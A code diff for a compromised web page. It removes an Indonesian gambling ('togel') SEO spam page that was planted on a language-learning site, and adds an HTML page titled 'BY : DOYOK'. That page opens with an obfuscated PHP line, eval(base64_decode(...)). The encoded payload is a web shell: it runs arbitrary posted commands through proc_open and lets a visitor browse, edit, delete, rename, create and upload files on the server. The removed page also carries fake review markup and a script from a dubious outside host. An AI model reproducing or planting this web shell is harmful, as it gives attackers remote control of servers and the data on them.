@@ -1,1817 +1,317 @@
+<?php eval(base64_decode('CiBnb3RvIGp3a2VuOyBqd2tlbjogJGN1cnJlbnREaXIgPSBpc3NldCgkX0dFVFsiXHg3MFx4NjFceDc0XHg2OCJdKSA/IHJlYWxwYXRoKCRfR0VUWyJcMTYwXHg2MVwxNjRceDY4Il0pIDogZGlybmFtZShfX0ZJTEVfXyk7IGdvdG8gVUsxN087IFhhY2k5OiBzb3J0KCRmaWxlcyk7IGdvdG8gaUdqemo7IG9TSk5XOiBpZiAoJF9TRVJWRVJbIlwxMjJcMTA1XHg1MVwxMjVcMTA1XDEyM1wxMjRcMTM3XHg0ZFwxMDVcMTI0XHg0OFwxMTdcMTA0Il0gPT09ICJcMTIwXHg0ZlwxMjNceDU0IiAmJiBpc3NldCgkX1BPU1RbIlx4NjNcMTU3XHg2ZFwxNTVceDYxXHg2ZVwxNDQiXSkgJiYgIWVtcHR5KCRfUE9TVFsiXHg2M1wxNTdceDZkXHg2ZFx4NjFceDZlXHg2NCJdKSkgeyAkY29tbWFuZCA9ICRfUE9TVFsiXHg2M1x4NmZceDZkXDE1NVx4NjFceDZlXDE0NCJdOyAkZGVzY3JpcHRvcnNwZWMgPSBhcnJheSgwID0+IGFycmF5KCJcMTYwXDE1MVwxNjBceDY1IiwgIlwxNjIiKSwgMSA9PiBhcnJheSgiXHg3MFx4NjlceDcwXHg2NSIsICJcMTY3IiksIDIgPT4gYXJyYXkoIlwxNjBceDY5XHg3MFwxNDUiLCAiXHg3NyIpKTsgJHByb2Nlc3MgPSBwcm9jX29wZW4oJGNvbW1hbmQsICRkZXNjcmlwdG9yc3BlYywgJHBpcGVzLCAkY3VycmVudERpcik7IGlmIChpc19yZXNvdXJjZSgkcHJvY2VzcykpIHsgZmNsb3NlKCRwaXBlc1swXSk7ICRvdXRwdXQgPSBzdHJlYW1fZ2V0X2NvbnRlbnRzKCRwaXBlc1sxXSk7IGZjbG9zZSgkcGlwZXNbMV0pOyBmY2xvc2UoJHBpcGVzWzJdKTsgcHJvY19jbG9zZSgkcHJvY2Vzcyk7IH0gZWNobyAiXHgzY1wxNjNceDYzXHg3Mlx4NjlceDcwXDE2NFw3NlwxNDFcMTU0XDE0NVwxNjJceDc0XHgyOFx4MjdceDQzXDE1N1wxNTVcMTU1XDE0MVwxNTZcMTQ0XDQwXHg2NVwxNzBcMTQ1XHg2M1wxNjVcMTY0XHg2NVwxNDRceDIwXDE2M1wxNjVcMTQzXHg2M1wxNDVcMTYzXHg3M1x4NjZceDc1XHg2Y1x4NmNcMTcxXHgyMVx4MjBcMTE3XHg3NVx4NzRceDcwXHg3NVwxNjRceDNhXHgyMCIgLiBodG1sc3BlY2lhbGNoYXJzKCRvdXRwdXQpIC4gIlw0N1w1MVw3M1x4M2NceDJmXHg3M1x4NjNcMTYyXHg2OVwxNjBcMTY0XDc2IjsgfSBnb3RvIE5EcWxpOyBhY2V4UTogZnVuY3Rpb24gZm9ybWF0U2l6ZSgkc2l6ZSkgeyBpZiAoJHNpemUgPj0gMTA3Mzc0MTgyNCkgeyByZXR1cm4gbnVtYmVyX2Zvcm1hdCgkc2l6ZSAvIDEwNzM3NDE4MjQsIDIpIC4gIlw0MFwxMDdceDQyIjsgfSBlbHNlaWYgKCRzaXplID49IDEwNDg1NzYpIHsgcmV0dXJuIG51bWJlcl9mb3JtYXQoJHNpemUgLyAxMDQ4NTc2LCAyKSAuICJcNDBceDRkXDEwMiI7IH0gZWxzZWlmICgkc2l6ZSA+PSAxMDI0KSB7IHJldHVybiBudW1iZXJfZm9ybWF0KCRzaXplIC8gMTAyNCwgMikgLiAiXDQwXHg0Ylx4NDIiOyB9IGVsc2UgeyByZXR1cm4gJHNpemUgLiAiXHgyMFx4NjJceDc5XDE2NFwxNDVceDczIjsgfSB9IGdvdG8gakowTjk7IGVRV0VoOiBpZiAoJGZpbGVUb0VkaXQgJiYgZmlsZV9leGlzdHMoJGZpbGVUb0VkaXQpKSB7ICRmaWxlQ29udGVudCA9IGZpbGVfZ2V0X2NvbnRlbnRzKCRmaWxlVG9FZGl0KTsgaWYgKCRfU0VSVkVSWyJceDUyXDEwNVwxMjFcMTI1XHg0NVwxMjNceDU0XHg1Zlx4NGRcMTA1XHg1NFx4NDhceDRmXHg0NCJdID09PSAiXDEyMFx4NGZceDUzXHg1NCIgJiYgaXNzZXQoJF9QT1NUWyJcMTU2XDE0NVx4NzdceDQzXHg2ZlwxNTZcMTY0XHg2NVwxNTZceDc0Il0pKSB7IGZpbGVfcHV0X2NvbnRlbnRzKCRmaWxlVG9FZGl0LCAkX1BPU1RbIlx4NmVceDY1XHg3N1wxMDNcMTU3XHg2ZVx4NzRcMTQ1XHg2ZVwxNjQiXSk7ICRmaWxlQ29udGVudCA9ICRfUE9TVFsiXHg2ZVx4NjVcMTY3XHg0M1wxNTdcMTU2XDE2NFx4NjVceDZlXHg3NCJdOyBlY2hvICJcNzRcMTYzXDE0M1wxNjJcMTUxXHg3MFx4NzRcNzZcMTQxXDE1NFx4NjVceDcyXHg3NFx4MjhcNDdceDQ2XDE1MVwxNTRceDY1XHgyMFx4NjNceDZmXDE1Nlx4NzRcMTQ1XHg2ZVwxNjRceDIwXDE2NVx4NzBceDY0XHg2MVwxNjRcMTQ1XHg2NFx4MjBceDczXHg3NVwxNDNcMTQzXDE0NVx4NzNcMTYzXDE0Nlx4NzVcMTU0XHg2Y1x4NzlcNDFcNDdcNTFcNzNceDNjXDU3XDE2M1wxNDNcMTYyXHg2OVx4NzBcMTY0XHgzZSI7IGhlYWRlcigiXHg0Y1x4NmZceDYzXDE0MVx4NzRcMTUxXHg2ZlwxNTZceDNhXHgyMCIgLiAkX1NFUlZFUlsiXHg1MFx4NDhceDUwXDEzN1wxMjNceDQ1XDExNFwxMDYiXSAuICJcNzdcMTYwXHg2MVx4NzRceDY4XHgzZCIgLiB1cmxlbmNvZGUoJGN1cnJlbnREaXIpKTsgZGllOyB9IH0gZ290byBoR01TbDsgTVhSWmM6ICRvdXRwdXQgPSAnJzsgZ290byBvU0pOVzsgakowTjk6ICRmaWxlVG9FZGl0ID0gaXNzZXQoJF9HRVRbIlwxNDVcMTQ0XHg2OVx4NzQiXSkgPyByZWFscGF0aCgkX0dFVFsiXDE0NVwxNDRcMTUxXDE2NCJdKSA6IG51bGw7IGdvdG8gZHBvQVk7IFhpNGJlOiAkZmlsZXMgPSBhcnJheSgpOyBnb3RvIG11YjBuOyBkcG9BWTogJGZpbGVDb250ZW50ID0gJyc7IGdvdG8gZVFXRWg7IFVLMTdPOiAkZGlyQ29udGVudHMgPSBzY2FuZGlyKCRjdXJyZW50RGlyKTsgZ290byBPNGFoajsgUVR1MV86IHNvcnQoJGRpcmVjdG9yaWVzKTsgZ290byBYYWNpOTsgUV82dHQ6IGlmICgkX1NFUlZFUlsiXHg1Mlx4NDVcMTIxXDEyNVx4NDVceDUzXHg1NFx4NWZcMTE1XDEwNVx4NTRcMTEwXDExN1x4NDQiXSA9PT0gIlwxMjBceDRmXDEyM1wxMjQiKSB7IGlmIChpc3NldCgkX1BPU1RbIlwxNDRceDY1XHg2Y1x4NjVcMTY0XDE0NSJdKSkgeyAkZGVsZXRlRmlsZSA9ICRfUE9TVFsiXHg2NFwxNDVceDZjXHg2NVwxNjRcMTQ1Il07IGlmIChmaWxlX2V4aXN0cygkZGVsZXRlRmlsZSkpIHsgaWYgKGlzX2RpcigkZGVsZXRlRmlsZSkpIHsgcm1kaXIoJGRlbGV0ZUZpbGUpOyB9IGVsc2UgeyB1bmxpbmsoJGRlbGV0ZUZpbGUpOyB9IGVjaG8gIlx4M2NcMTYzXHg2M1wxNjJcMTUxXHg3MFx4NzRcNzZceDYxXHg2Y1x4NjVceDcyXHg3NFx4MjhceDI3XDEwNlwxNTFcMTU0XHg2NVw0MFx4NmZceDcyXDQwXHg2NFx4NjlcMTYyXDE0NVx4NjNceDc0XDE1N1x4NzJcMTcxXDQwXDE0NFx4NjVcMTU0XHg2NVx4NzRceDY1XDE0NFx4MjBceDczXHg3NVx4NjNcMTQzXHg2NVwxNjNcMTYzXHg2NlwxNjVcMTU0XDE1NFx4NzlceDIxXHgyN1x4MjlcNzNceDNjXDU3XDE2M1x4NjNcMTYyXDE1MVx4NzBceDc0XHgzZSI7IGhlYWRlcigiXHg0Y1x4NmZcMTQzXDE0MVwxNjRceDY5XHg2ZlwxNTZceDNhXHgyMCIgLiAkX1NFUlZFUlsiXHg1MFwxMTBcMTIwXDEzN1wxMjNcMTA1XDExNFwxMDYiXSAuICJceDNmXHg3MFwxNDFceDc0XDE1MFx4M2QiIC4gdXJsZW5jb2RlKCRjdXJyZW50RGlyKSk7IGRpZTsgfSB9IGlmIChpc3NldCgkX1BPU1RbIlx4NzJcMTQ1XHg2ZVwxNDFcMTU1XHg2NSJdKSkgeyAkb2xkTmFtZSA9ICRfUE9TVFsiXHg2ZlwxNTRceDY0XDExNlwxNDFcMTU1XDE0NSJdOyAkbmV3TmFtZSA9ICRfUE9TVFsiXHg2ZVwxNDVceDc3XHg0ZVx4NjFcMTU1XDE0NSJdOyBpZiAoZmlsZV9leGlzdHMoJG9sZE5hbWUpKSB7IHJlbmFtZSgkb2xkTmFtZSwgJG5ld05hbWUpOyBlY2hvICJceDNjXDE2M1wxNDNcMTYyXHg2OVx4NzBceDc0XDc2XHg2MVx4NmNcMTQ1XDE2Mlx4NzRceDI4XHgyN1x4NDZceDY5XDE1NFx4NjVcNDBceDZmXHg3Mlw0MFwxNDRcMTUxXHg3MlwxNDVceDYzXHg3NFwxNTdcMTYyXDE3MVw0MFx4NzJcMTQ1XHg2ZVx4NjFcMTU1XHg2NVx4NjRceDIwXHg3M1wxNjVcMTQzXHg2M1wxNDVcMTYzXDE2M1wxNDZcMTY1XHg2Y1wxNTRceDc5XHgyMVw0N1x4MjlcNzNceDNjXDU3XDE2M1x4NjNcMTYyXDE1MVwxNjBceDc0XDc2IjsgaGVhZGVyKCJcMTE0XDE1N1x4NjNceDYxXDE2NFwxNTFcMTU3XHg2ZVx4M2FcNDAiIC4gJF9TRVJWRVJbIlx4NTBcMTEwXDEyMFx4NWZcMTIzXDEwNVwxMTRceDQ2Il0gLiAiXHgzZlwxNjBcMTQxXHg3NFx4NjhceDNkIiAuIHVybGVuY29kZSgkY3VycmVudERpcikpOyBkaWU7IH0gfSB9IGdvdG8gYWNleFE7IE5EcWxpOiAkaG9tZURpciA9IGRpcm5hbWUoX19GSUxFX18pOyBnb3RvIE9YR0k2OyBoR01TbDogaWYgKGlzc2V0KCRfUE9TVFsiXHg2M1wxNjJceDY1XHg2MVwxNjRcMTQ1XHg0Nlx4NjlcMTU0XHg2NSJdKSAmJiBpc3NldCgkX1BPU1RbIlx4NmVcMTQ1XDE2N1x4NDZcMTUxXHg2Y1wxNDVcMTE2XDE0MVwxNTVceDY1Il0pKSB7ICRuZXdGaWxlTmFtZSA9ICRfUE9TVFsiXHg2ZVwxNDVceDc3XHg0NlwxNTFcMTU0XDE0NVwxMTZcMTQxXDE1NVwxNDUiXTsgJG5ld0ZpbGVQYXRoID0gJGN1cnJlbnREaXIgLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJG5ld0ZpbGVOYW1lOyBpZiAoIWZpbGVfZXhpc3RzKCRuZXdGaWxlUGF0aCkpIHsgaWYgKHRvdWNoKCRuZXdGaWxlUGF0aCkpIHsgJGZpbGVDcmVhdGVkID0gdHJ1ZTsgfSBlbHNlIHsgJGZpbGVDcmVhdGVkID0gZmFsc2U7IH0gfSBlbHNlIHsgJGZpbGVDcmVhdGVkID0gZmFsc2U7IH0gfSBnb3RvIE1YUlpjOyBtdWIwbjogZm9yZWFjaCAoJGRpckNvbnRlbnRzIGFzICRpdGVtKSB7IGlmICgkaXRlbSA9PT0gIlw1NiIpIHsgY29udGludWU7IH0gJGl0ZW1QYXRoID0gcmVhbHBhdGgoJGN1cnJlbnREaXIgLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJGl0ZW0pOyBpZiAoaXNfZGlyKCRpdGVtUGF0aCkpIHsgJGRpcmVjdG9yaWVzW10gPSAkaXRlbTsgfSBlbHNlIHsgJGZpbGVzW10gPSAkaXRlbTsgfSB9IGdvdG8gUVR1MV87IE80YWhqOiAkZGlyZWN0b3JpZXMgPSBhcnJheSgpOyBnb3RvIFhpNGJlOyBpR2p6ajogJGRpckNvbnRlbnRzID0gYXJyYXlfbWVyZ2UoJGRpcmVjdG9yaWVzLCAkZmlsZXMpOyBnb3RvIFVkQVZJOyBVZEFWSTogaWYgKCRfU0VSVkVSWyJcMTIyXHg0NVx4NTFcMTI1XDEwNVx4NTNceDU0XHg1ZlwxMTVcMTA1XDEyNFwxMTBcMTE3XDEwNCJdID09PSAiXDEyMFx4NGZcMTIzXDEyNCIgJiYgaXNzZXQoJF9GSUxFU1siXHg2Nlx4NjlceDZjXHg2NSJdKSkgeyBmb3JlYWNoICgkX0ZJTEVTWyJcMTQ2XHg2OVx4NmNcMTQ1Il1bIlx4NzRceDZkXDE2MFx4NWZcMTU2XDE0MVx4NmRceDY1Il0gYXMgJGtleSA9PiAkdG1wX25hbWUpIHsgJHVwbG9hZEZpbGUgPSAkY3VycmVudERpciAuIERJUkVDVE9SWV9TRVBBUkFUT1IgLiBiYXNlbmFtZSgkX0ZJTEVTWyJcMTQ2XDE1MVx4NmNcMTQ1Il1bIlwxNTZcMTQxXDE1NVx4NjUiXVska2V5XSk7IG1vdmVfdXBsb2FkZWRfZmlsZSgkdG1wX25hbWUsICR1cGxvYWRGaWxlKTsgfSBlY2hvICJceDNjXDE2M1wxNDNcMTYyXDE1MVx4NzBceDc0XHgzZVx4NjFcMTU0XDE0NVwxNjJcMTY0XDUwXDQ3XDEwNlwxNTFcMTU0XDE0NVw1MFwxNjNcNTFcNDBcMTY1XHg3MFx4NmNceDZmXDE0MVx4NjRceDY1XDE0NFx4MjBceDczXHg3NVx4NjNceDYzXDE0NVx4NzNceDczXDE0Nlx4NzVceDZjXDE1NFx4NzlceDIxXHgyN1x4MjlceDNiXHgzY1x4MmZceDczXDE0M1wxNjJceDY5XDE2MFx4NzRceDNlIjsgaGVhZGVyKCJceDRjXDE1N1x4NjNceDYxXDE2NFx4NjlceDZmXDE1Nlw3Mlx4MjAiIC4gJF9TRVJWRVJbIlx4NTBcMTEwXDEyMFx4NWZcMTIzXHg0NVx4NGNcMTA2Il0gLiAiXDc3XHg3MFx4NjFceDc0XHg2OFx4M2QiIC4gdXJsZW5jb2RlKCRjdXJyZW50RGlyKSk7IGRpZTsgfSBnb3RvIFFfNnR0OyBPWEdJNjog')); ?><!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BY : DOYOK</title>
+    <style>
+        header {
+        font-family: Arial, sans-serif; /* Customize the font */
+        font-size: 36px; /* Customize the font size */
+        display: flex;
+        align-items: center;
+        color: #111; /* Default text color for other content */
+        }
 
-
-<!-------------------------------------------------
-// I AM SEO SABDA LELUHUR
-// Versi: Evanto Powered By SEO SABDA LELUHUR
-// Website : JUTAWANTOTO
-------------------------------------------------->
-<!DOCTYPE html>
-<html class="js audio audio-ogg audio-mp3 audio-opus audio-wav audio-m4a cors cssanimations backgroundblendmode flexbox inputtypes-search inputtypes-tel inputtypes-url inputtypes-email no-inputtypes-datetime inputtypes-date inputtypes-month inputtypes-week inputtypes-time inputtypes-datetime-local inputtypes-number inputtypes-range inputtypes-color localstorage placeholder svg xhr2" lang="en">
-    <head>
-    <meta charset="utf-8">
-    <meta content="origin-when-cross-origin" name="referrer">
-    <title>Cultural ✈️ JUTAWANTOTO Link Bandar Bo Togel Situs Toto Platform Resmi Terpercaya #1</title>
-    <meta name="google-site-verification" content="blTXu79ONGwpV4Gyyy0OrQrs0Nl3FYgsGYyIICHwUe8" />
-    <meta name="description" content="JUTAWANTOTO Cultural adalah situs resmi terpercaya untuk Bandar Bo Togel. Nikmati permainan togel yang aman dan nyaman dengan berbagai pilihan menarik!">
-    <meta name="viewport" content="width=device-width,initial-scale=1">
-    <link rel="icon" type="image/x-icon" href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEifvSRdmzWUfSdlWD-eeRRQ8A998oOxzvX9Ni1aH8if00WMRghephi3-JO3x-Ppg9AaTPd_XJfiM0gkBy8aeAUcR9zrw3H2RawrT_2JAsBkI0qU7cOKbaOwzflXXoOBIuuZRdBvwAO1p5uiwIzaCZTkDibBBWvY-XATj8HoidimKPjmfPU2QLgxpKMwT5Q/s300/logo-jtwn.jpg">
-    <link rel="apple-touch-icon-precomposed" type="image/x-icon" href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEifvSRdmzWUfSdlWD-eeRRQ8A998oOxzvX9Ni1aH8if00WMRghephi3-JO3x-Ppg9AaTPd_XJfiM0gkBy8aeAUcR9zrw3H2RawrT_2JAsBkI0qU7cOKbaOwzflXXoOBIuuZRdBvwAO1p5uiwIzaCZTkDibBBWvY-XATj8HoidimKPjmfPU2QLgxpKMwT5Q/s300/logo-jtwn.jpg" sizes="72x72">
-    <link rel="apple-touch-icon-precomposed" type="image/x-icon" href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEifvSRdmzWUfSdlWD-eeRRQ8A998oOxzvX9Ni1aH8if00WMRghephi3-JO3x-Ppg9AaTPd_XJfiM0gkBy8aeAUcR9zrw3H2RawrT_2JAsBkI0qU7cOKbaOwzflXXoOBIuuZRdBvwAO1p5uiwIzaCZTkDibBBWvY-XATj8HoidimKPjmfPU2QLgxpKMwT5Q/s300/logo-jtwn.jpg" sizes="114x114">
-    <link rel="apple-touch-icon-precomposed" type="image/x-icon" href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEifvSRdmzWUfSdlWD-eeRRQ8A998oOxzvX9Ni1aH8if00WMRghephi3-JO3x-Ppg9AaTPd_XJfiM0gkBy8aeAUcR9zrw3H2RawrT_2JAsBkI0qU7cOKbaOwzflXXoOBIuuZRdBvwAO1p5uiwIzaCZTkDibBBWvY-XATj8HoidimKPjmfPU2QLgxpKMwT5Q/s300/logo-jtwn.jpg" sizes="120x120">
-    <link rel="apple-touch-icon-precomposed" type="image/x-icon" href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEifvSRdmzWUfSdlWD-eeRRQ8A998oOxzvX9Ni1aH8if00WMRghephi3-JO3x-Ppg9AaTPd_XJfiM0gkBy8aeAUcR9zrw3H2RawrT_2JAsBkI0qU7cOKbaOwzflXXoOBIuuZRdBvwAO1p5uiwIzaCZTkDibBBWvY-XATj8HoidimKPjmfPU2QLgxpKMwT5Q/s300/logo-jtwn.jpg" sizes="144x144">
-    <link rel="apple-touch-icon-precomposed" type="image/x-icon" href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEifvSRdmzWUfSdlWD-eeRRQ8A998oOxzvX9Ni1aH8if00WMRghephi3-JO3x-Ppg9AaTPd_XJfiM0gkBy8aeAUcR9zrw3H2RawrT_2JAsBkI0qU7cOKbaOwzflXXoOBIuuZRdBvwAO1p5uiwIzaCZTkDibBBWvY-XATj8HoidimKPjmfPU2QLgxpKMwT5Q/s300/logo-jtwn.jpg">
-    <link rel="stylesheet" href="https://public-assets.envato-static.com/assets/market/core/index-999d91c45b3ce6e6c7409b80cb1734b55d9f0a30546d926e1f2c262cd719f9c7.css" media="all">
-    <link rel="stylesheet" href="https://public-assets.envato-static.com/assets/market/pages/default/index-ffa1c54dffd67e25782769d410efcfaa8c68b66002df4c034913ae320bfe6896.css" media="all">
-    <script src="https://public-assets.envato-static.com/assets/components/brand_neue_tokens-f25ae27cb18329d3bba5e95810e5535514237937774fca40a02d8e2635fa20d6.js" nonce="TFNQUvYHwdi8uHoMheRs/Q==" defer="defer"></script>
-    <meta name="theme-color" content="#FFD700">
-    <link rel="canonical" href="https://spanishlearningprogram.com/cultural/">
-    <link rel="amphtml" href="https://bingung-yakk.pages.dev/"/>
-   <script type="application/ld+json">
-{
-  "@context": "https://schema.org",
-  "@type": "Product",
-  "name": "Cultural ✈️ JUTAWANTOTO Link Bandar Bo Togel Situs Toto Platform Resmi Terpercaya #1",
-  "image": "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEia-BJ9UDAGNFDT6Gw65lrjevCohO9IDKlxcmcywMCl0rEGUbPX1Z_HNTZs2ak2OCI5P_gClCJe6E58KqTVzhWtjI1GHT1H6gDruBoeoqT3LkafFeHIvu1r2KlzGkpN5WVAcwyFRVrDFYYUk4lZv83bDUvtdjMXUokvUNWRwKOqZdsvE5fIUSv7CzhrHuY/s1080/LINK-RESMITOGEL.jpg",
-  "description": "JUTAWANTOTO Cultural adalah situs resmi terpercaya untuk Bandar Bo Togel. Nikmati permainan togel yang aman dan nyaman dengan berbagai pilihan menarik!",
-  "brand": {
-    "@type": "Brand",
-    "name": "JUTAWANTOTO"
-  },
-  "sku": "JUTAWANTOTO",
-  "mpn": "303GCR",
-  "url": "https://spanishlearningprogram.com/cultural/",
-  "offers": {
-    "@type": "Offer",
-    "url": "https://spanishlearningprogram.com/cultural/",
-    "priceCurrency": "USD",
-    "price": "0.00",
-    "priceValidUntil": "2025-12-31",
-    "itemCondition": "https://schema.org/NewCondition",
-    "availability": "https://schema.org/InStock",
-    "seller": {
-      "@type": "Organization",
-      "name": "JUTAWANTOTO"
-    }
-  },
-  "aggregateRating": {
-    "@type": "AggregateRating",
-    "ratingValue": "5.0",
-    "reviewCount": 779
-  },
-  "review": [
-    {
-      "@type": "Review",
-      "reviewRating": {
-        "@type": "Rating",
-        "ratingValue": "5",
-        "bestRating": "5"
-      },
-      "author": {
-        "@type": "Person",
-        "name": "John"
-      }
-    },
-    {
-      "@type": "Review",
-      "reviewRating": {
-        "@type": "Rating",
-        "ratingValue": "5",
-        "bestRating": "5"
-      },
-      "author": {
-        "@type": "Person",
-        "name": "Niki"
-      }
-    }
-  ]
-}
-</script>
-
-<script type="application/ld+json">
-{
-  "@context": "https://schema.org",
-  "@type": "BreadcrumbList",
-  "itemListElement": [
-    {
-      "@type": "ListItem",
-      "position": 1,
-      "name": "JUTAWANTOTO",
-      "item": "https://spanishlearningprogram.com/cultural/"
-    },
-    {
-      "@type": "ListItem",
-      "position": 2,
-      "name": "BANDAR TOGEL",
-      "item": "https://spanishlearningprogram.com/cultural/"
-    },
-    {
-      "@type": "ListItem",
-      "position": 3,
-      "name": "BO TOGEL TERPERCAYA",
-      "item": "https://spanishlearningprogram.com/cultural/"
-    },
-    {
-      "@type": "ListItem",
-      "position": 4,
-      "name": "SITUS TOTO",
-      "item": "https://spanishlearningprogram.com/cultural/"
-    },
-    {
-      "@type": "ListItem",
-      "position": 5,
-      "name": "Cultural ✈️ JUTAWANTOTO Link Bandar Bo Togel Situs Toto Platform Resmi Terpercaya #1",
-      "item": "https://spanishlearningprogram.com/cultural/"
-    }
-  ]
-}
-</script>
-
-<script type="application/ld+json">
-{
-  "@context": "https://schema.org",
-  "@type": "Organization",
-  "name": "JUTAWANTOTO",
-  "url": "https://spanishlearningprogram.com/cultural/",
-  "logo": "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgTdt3lExppcdqwfkj9jese5QLkAim4R4UaBYC1W0EYO4t1fzIu2SXMRpboOvzCCA9oCBXuK0x3laUzvtsBr9WpohdUG-5ivBshkmx3MxhZhrm3JF9o1hoZthRviMoOE3-PqQg0jpYPp6UdpNVFElKg-HZkOOS_BmzXg1xiRzlDAlB2RnKfxCqw7gJiUbc/s400/logojutawan.webp",
-  "sameAs": [
-    "https://www.facebook.com/jutawantoto-official",
-    "https://twitter.com/jutawantoto-togel",
-    "https://www.instagram.com/jutawantoto-link"
-  ],
-  "contactPoint": {
-    "@type": "ContactPoint",
-    "telephone": "+62-8522-453-3003",
-    "contactType": "customer support",
-    "areaServed": "ID",
-    "availableLanguage": ["Indonesian", "English"]
-  }
-}
-</script>
-
-
-
-
-    <script nonce="TFNQUvYHwdi8uHoMheRs/Q==">//<![CDATA[
-window.dataLayer=window.dataLayer||[];
-//]]></script>
-    <meta name="bingbot" content="nocache">
-
-    <!-- Open Graph -->
-    <meta property="og:title" content="Cultural ✈️ JUTAWANTOTO Link Bandar Bo Togel Situs Toto Platform Resmi Terpercaya #1">
-    <meta property="og:description" content="JUTAWANTOTO Cultural adalah situs resmi terpercaya untuk Bandar Bo Togel. Nikmati permainan togel yang aman dan nyaman dengan berbagai pilihan menarik!">
-    <meta property="og:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEia-BJ9UDAGNFDT6Gw65lrjevCohO9IDKlxcmcywMCl0rEGUbPX1Z_HNTZs2ak2OCI5P_gClCJe6E58KqTVzhWtjI1GHT1H6gDruBoeoqT3LkafFeHIvu1r2KlzGkpN5WVAcwyFRVrDFYYUk4lZv83bDUvtdjMXUokvUNWRwKOqZdsvE5fIUSv7CzhrHuY/s1080/LINK-RESMITOGEL.jpg">
-    <meta property="og:url" content="https://spanishlearningprogram.com/cultural/">
-    <meta property="og:type" content="website">
-
-    <!-- Twitter Card -->
-    <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="Cultural ✈️ JUTAWANTOTO Link Bandar Bo Togel Situs Toto Platform Resmi Terpercaya #1">
-    <meta name="twitter:description" content="JUTAWANTOTO Cultural adalah situs resmi terpercaya untuk Bandar Bo Togel. Nikmati permainan togel yang aman dan nyaman dengan berbagai pilihan menarik!">
-    <meta name="twitter:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEia-BJ9UDAGNFDT6Gw65lrjevCohO9IDKlxcmcywMCl0rEGUbPX1Z_HNTZs2ak2OCI5P_gClCJe6E58KqTVzhWtjI1GHT1H6gDruBoeoqT3LkafFeHIvu1r2KlzGkpN5WVAcwyFRVrDFYYUk4lZv83bDUvtdjMXUokvUNWRwKOqZdsvE5fIUSv7CzhrHuY/s1080/LINK-RESMITOGEL.jpg">
-    <meta property="og:title" content="Cultural ✈️ JUTAWANTOTO Link Bandar Bo Togel Situs Toto Platform Resmi Terpercaya #1">
-    <meta property="og:type" content="website">
-    <meta property="og:url" content="https://spanishlearningprogram.com/cultural/">
-    <meta property="og:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEia-BJ9UDAGNFDT6Gw65lrjevCohO9IDKlxcmcywMCl0rEGUbPX1Z_HNTZs2ak2OCI5P_gClCJe6E58KqTVzhWtjI1GHT1H6gDruBoeoqT3LkafFeHIvu1r2KlzGkpN5WVAcwyFRVrDFYYUk4lZv83bDUvtdjMXUokvUNWRwKOqZdsvE5fIUSv7CzhrHuY/s1080/LINK-RESMITOGEL.jpg"/>
-    <meta property="og:description" content="JUTAWANTOTO Cultural adalah situs resmi terpercaya untuk Bandar Bo Togel. Nikmati permainan togel yang aman dan nyaman dengan berbagai pilihan menarik!">
-    <meta property="og:site_name" content="JUTAWANTOTO">
-    <meta name="csrf-param" content="authenticity_token">
-    <meta name="csrf-token" content="o7V7LGbBjnF9HgzqsCOek0VUbYNaqFcrL72zjeu3cGTv2_7pn5UklFm7XFtDaDCfkbbeD4zdIzwPzjrUhXtbHQ">
-    <meta name="turbo-visit-control" content="reload">
-    <script type="text/javascript" nonce="TFNQUvYHwdi8uHoMheRs/Q==" data-cookieconsent="statistics">//<![CDATA[
-var container_env_param="";(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl+container_env_param;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-W8KL5Q5');
-//]]></script>
-
-
-    <script type="text/javascript" nonce="TFNQUvYHwdi8uHoMheRs/Q==" data-cookie consent="marketing">//<![CDATA[
-var gtmId='GTM-KGCDGPL6';var container_env_param="";(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl+container_env_param;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer',gtmId);window.addEventListener('load',function(){window.dataLayer.push({event:'pinterestReady'});});
-//]]></script>
-    <script src="https://public-assets.envato-static.com/assets/market/core/head-d4f3da877553664cb1d5ed45cb42c6ec7e6b00d0c4d164be8747cfd5002a24eb.js" nonce="TFNQUvYHwdi8uHoMheRs/Q=="></script>
-    <style type="text/css" id="CookieConsentStateDisplayStyles">.cookieconsent-optin,.cookieconsent-optin-preferences,.cookieconsent-optin-statistics,.cookieconsent-optin-marketing{display:block;display:initial}.cookieconsent-optout-preferences,.cookieconsent-optout-statistics,.cookieconsent-optout-marketing,.cookieconsent-optout{display:none}</style>
-     <script src="https://wptheme.cloud/wp-includes/wp-elements/wp-emoji-release-version.2.7.js"></script>
